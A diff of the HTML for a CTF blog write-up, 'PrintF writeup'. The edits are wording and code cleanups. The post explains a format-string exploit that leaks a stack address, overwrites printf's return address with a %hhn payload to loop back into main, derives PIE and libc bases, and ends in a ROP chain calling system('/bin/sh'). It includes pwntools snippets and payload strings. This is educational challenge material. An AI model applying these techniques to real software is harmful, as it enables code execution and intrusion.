@@ -7,8 +7,8 @@
 <meta name="generator" content="Jekyll v3.10.0" />
 <meta property="og:title" content="PrintF writeup" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="In this challenge, I exploit a printf vulnerability. The program leaks a stack address and I use it to calculate the location of printf’s return address on the stack. By overwriting its lsb, I force the program to return into and earlier part of main instead of exiting. Like that I gave me another round to exploit the printf vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the printf return address but this time with a ROP chain calling system(&quot;/bin/sh&quot;)." />
-<meta property="og:description" content="In this challenge, I exploit a printf vulnerability. The program leaks a stack address and I use it to calculate the location of printf’s return address on the stack. By overwriting its lsb, I force the program to return into and earlier part of main instead of exiting. Like that I gave me another round to exploit the printf vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the printf return address but this time with a ROP chain calling system(&quot;/bin/sh&quot;)." />
+<meta name="description" content="In this challenge, I exploit a printf vulnerability. The program leaks a stack address and I use it to calculate the location of printf’s return address on the stack. By overwriting its least significant byte, I force the program to return into and earlier part of main instead of exiting. Like that I gave me another round to exploit the printf vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the printf return address but this time with a ROP chain calling system(&quot;/bin/sh&quot;)." />
+<meta property="og:description" content="In this challenge, I exploit a printf vulnerability. The program leaks a stack address and I use it to calculate the location of printf’s return address on the stack. By overwriting its least significant byte, I force the program to return into and earlier part of main instead of exiting. Like that I gave me another round to exploit the printf vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the printf return address but this time with a ROP chain calling system(&quot;/bin/sh&quot;)." />
 <link rel="canonical" href="https://psjsus4.github.io//bitsiege/ctf/2025/05/07/PrintF.html" />
 <meta property="og:url" content="https://psjsus4.github.io//bitsiege/ctf/2025/05/07/PrintF.html" />
 <meta property="og:site_name" content="Psjsus4 blog" />
@@ -17,7 +17,7 @@
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="PrintF writeup" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-05-07T22:22:22+00:00","datePublished":"2025-05-07T22:22:22+00:00","description":"In this challenge, I exploit a printf vulnerability. The program leaks a stack address and I use it to calculate the location of printf’s return address on the stack. By overwriting its lsb, I force the program to return into and earlier part of main instead of exiting. Like that I gave me another round to exploit the printf vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the printf return address but this time with a ROP chain calling system(&quot;/bin/sh&quot;).","headline":"PrintF writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://psjsus4.github.io//bitsiege/ctf/2025/05/07/PrintF.html"},"url":"https://psjsus4.github.io//bitsiege/ctf/2025/05/07/PrintF.html"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-05-07T22:22:22+00:00","datePublished":"2025-05-07T22:22:22+00:00","description":"In this challenge, I exploit a printf vulnerability. The program leaks a stack address and I use it to calculate the location of printf’s return address on the stack. By overwriting its least significant byte, I force the program to return into and earlier part of main instead of exiting. Like that I gave me another round to exploit the printf vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the printf return address but this time with a ROP chain calling system(&quot;/bin/sh&quot;).","headline":"PrintF writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://psjsus4.github.io//bitsiege/ctf/2025/05/07/PrintF.html"},"url":"https://psjsus4.github.io//bitsiege/ctf/2025/05/07/PrintF.html"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://psjsus4.github.io//feed.xml" title="Psjsus4 blog" /></head>
 <body><header class="site-header" role="banner">
@@ -47,9 +47,9 @@
   </header>
 
   <div class="post-content e-content" itemprop="articleBody">
-    <p>In this challenge, I exploit a <code class="language-plaintext highlighter-rouge">printf</code> vulnerability. The program leaks a stack address and I use it to calculate the location of <code class="language-plaintext highlighter-rouge">printf</code>’s return address on the stack. By overwriting its lsb, I force the program to return into and earlier part of <code class="language-plaintext highlighter-rouge">main</code> instead of exiting. Like that I gave me another round to exploit the <code class="language-plaintext highlighter-rouge">printf</code> vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the <code class="language-plaintext highlighter-rouge">printf</code> return address but this time with a ROP chain calling <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>.</p>
+    <p>In this challenge, I exploit a <code class="language-plaintext highlighter-rouge">printf</code> vulnerability. The program leaks a stack address and I use it to calculate the location of <code class="language-plaintext highlighter-rouge">printf</code>’s return address on the stack. By overwriting its least significant byte, I force the program to return into and earlier part of <code class="language-plaintext highlighter-rouge">main</code> instead of exiting. Like that I gave me another round to exploit the <code class="language-plaintext highlighter-rouge">printf</code> vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the <code class="language-plaintext highlighter-rouge">printf</code> return address but this time with a ROP chain calling <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>.</p>
 
-<h2 id="code">Code</h2>
+<h2 id="printf-code">PrintF code</h2>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 <span class="p">{</span>
@@ -63,14 +63,13 @@
     <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
     <span class="n">var</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
     <span class="n">pBuf</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
-    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">pBuf</span><span class="p">(</span><span class="n">pcVar2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
-        <span class="n">pcVar2</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span>
+    <span class="p">{</span>   <span class="c1">//set to 0 the first 512 bytes of buf</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">pBuf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+        <span class="n">pBuf</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
     <span class="p">}</span>
     <span class="n">puts</span><span class="p">(</span><span class="s">"Easy peasy printf, don't you think?"</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"I feel generous so have this: %p</span><span class="err">
-</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"I feel generous so have this: %p"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var</span><span class="p">);</span>
     <span class="n">puts</span><span class="p">(</span><span class="s">"Show me you've got!"</span><span class="p">);</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
     <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>
@@ -81,18 +80,20 @@
 <span class="p">}</span>
 </code></pre></div></div>
 
+<p>Compiled with <code class="language-plaintext highlighter-rouge">canary</code>, <code class="language-plaintext highlighter-rouge">FULL RELRO</code>, <code class="language-plaintext highlighter-rouge">NX</code>, <code class="language-plaintext highlighter-rouge">PIE</code> enabled.</p>
+
 <hr />
 
 <h2 id="1-initial-leak--offset-calculation">1. Initial Leak &amp; Offset Calculation</h2>
 
 <ol>
   <li><strong>Leak the stack pointer</strong>: The program prints a stack address via <code class="language-plaintext highlighter-rouge">printf("...this: %p", &amp;var)</code>.</li>
-  <li><strong>Find <code class="language-plaintext highlighter-rouge">printf_ret</code></strong>: In GDB, I saw that the saved <code class="language-plaintext highlighter-rouge">rsp</code> value when <code class="language-plaintext highlighter-rouge">printf</code> returns is at <code class="language-plaintext highlighter-rouge">stack_leak - 0x14</code></li>
+  <li><strong>Find <code class="language-plaintext highlighter-rouge">printf_ret</code></strong>: In GDB, I saw that the saved <code class="language-plaintext highlighter-rouge">rsp</code> value when <code class="language-plaintext highlighter-rouge">printf</code> returns is at <code class="language-plaintext highlighter-rouge">stack_leak - 0x14</code> and it contains the address of <code class="language-plaintext highlighter-rouge">main</code> right before the <code class="language-plaintext highlighter-rouge">exit(0)</code>.</li>
 </ol>
 
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># In exploit():
-</span><span class="n">recvu</span><span class="p">(</span><span class="sa">b</span><span class="s">"this: 0x"</span><span class="p">)</span>
-<span class="n">stack_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">recvu</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"this: 0x"</span><span class="p">)</span>
+<span class="n">stack_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
 <span class="n">printf_ret</span>  <span class="o">=</span> <span class="n">stack_leak</span> <span class="o">-</span> <span class="mh">0x14</span>
 </code></pre></div></div>
 
@@ -100,10 +101,10 @@
 
 <h2 id="2-first-format-string-payload-loop-back">2. First Format-String Payload (Loop Back)</h2>
 
-<p>My goal is to overwrite the lsb of <code class="language-plaintext highlighter-rouge">printf_ret</code> so <code class="language-plaintext highlighter-rouge">printf</code> returns to an earlier part of <code class="language-plaintext highlighter-rouge">main</code>, letting me leak PIE and libc addresses and giving me the possibility to exploit the fsb again.</p>
+<p>My goal is to overwrite the least significant byte of <code class="language-plaintext highlighter-rouge">printf_ret</code> so <code class="language-plaintext highlighter-rouge">printf</code> returns to an earlier part of <code class="language-plaintext highlighter-rouge">main</code>, letting me leak PIE and libc addresses and giving me the possibility to exploit the fsb again.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
-    <span class="sa">b</span><span class="s">"dummy420"</span>      <span class="c1"># align the count
+    <span class="sa">b</span><span class="s">"dummy420"</span>      <span class="c1"># needed for writing the right byte
 </span>  <span class="o">+</span> <span class="sa">b</span><span class="s">"||%79$p|"</span>      <span class="c1"># leak PIE
 </span>  <span class="o">+</span> <span class="sa">b</span><span class="s">"||%75$p|"</span>      <span class="c1"># leak libc
 </span>  <span class="o">+</span> <span class="sa">b</span><span class="s">"|%12$hhn"</span>      <span class="c1"># write 1 byte into printf_ret
@@ -112,7 +113,7 @@
 </code></pre></div></div>
 
 <ul>
-  <li><code class="language-plaintext highlighter-rouge">%12$hhn</code> writes the number of printed bytes so far into the <code class="language-plaintext highlighter-rouge">printf</code> RIP address.</li>
+  <li><code class="language-plaintext highlighter-rouge">%12$hhn</code> writes the number of printed bytes so far (it is <code class="language-plaintext highlighter-rouge">42</code>… nice) into the <code class="language-plaintext highlighter-rouge">printf</code> return address.</li>
 </ul>
 
 <p>After this, the program loops and prints:</p>
@@ -126,7 +127,7 @@
 
 <ul>
   <li><strong>PIE base</strong> = <code class="language-plaintext highlighter-rouge">pie_leak - 0x1211</code></li>
-  <li><strong>libc base</strong> = <code class="language-plaintext highlighter-rouge">libc_leak - 0x2A1CA</code></li>
+  <li><strong>LIBC base</strong> = <code class="language-plaintext highlighter-rouge">libc_leak - 0x2A1CA</code></li>
 </ul>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pie_base</span>     <span class="o">=</span> <span class="n">pie_leak</span>    <span class="o">-</span> <span class="mh">0x1211</span>
